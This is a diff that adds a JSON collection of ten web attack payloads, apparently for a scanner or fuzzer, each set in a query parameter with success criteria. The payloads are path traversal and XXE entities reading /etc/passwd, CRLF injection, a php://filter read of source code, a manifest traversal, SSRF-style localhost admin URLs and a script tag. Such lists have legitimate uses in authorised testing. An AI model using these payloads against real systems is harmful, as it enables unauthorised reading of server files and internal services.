@@ -1,0 +1,112 @@
+[
+  {
+    "payload_id": "OWP-65322",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Error Info Disclosure)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "..\\..\\..\\..\\..\\..\\etc\\passwd",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|stack|trace|warning|fatal"
+    }
+  },
+  {
+    "payload_id": "OWP-65323",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Error Info Disclosure)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "%0d%0a",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|stack|trace|warning|fatal"
+    }
+  },
+  {
+    "payload_id": "OWP-65324",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Error Info Disclosure)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|stack|trace|warning|fatal"
+    }
+  },
+  {
+    "payload_id": "OWP-65325",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Error Info Disclosure)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "1=1",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|stack|trace|warning|fatal"
+    }
+  },
+  {
+    "payload_id": "OWP-65326",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Error Info Disclosure)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "1=2",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|stack|trace|warning|fatal"
+    }
+  },
+  {
+    "payload_id": "OWP-65327",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Error Info Disclosure)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "<script>throw new Error(\"test\")</script>",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|stack|trace|warning|fatal"
+    }
+  },
+  {
+    "payload_id": "OWP-65328",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Error Info Disclosure)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "php://filter/convert.base64-encode/resource=index.php",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|stack|trace|warning|fatal"
+    }
+  },
+  {
+    "payload_id": "OWP-65329",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Error Info Disclosure)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "../../META-INF/MANIFEST.MF",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|stack|trace|warning|fatal"
+    }
+  },
+  {
+    "payload_id": "OWP-65330",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Error Info Disclosure)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "//localhost:8080/admin",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|stack|trace|warning|fatal"
+    }
+  },
+  {
+    "payload_id": "OWP-65331",
+    "vulnerability_category": "Mishandling of Exceptional Conditions (Error Info Disclosure)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://127.0.0.1:80/admin",
+    "validation": {
+      "expected_status_code": 500,
+      "success_regex": "error|exception|stack|trace|warning|fatal"
+    }
+  }
+]
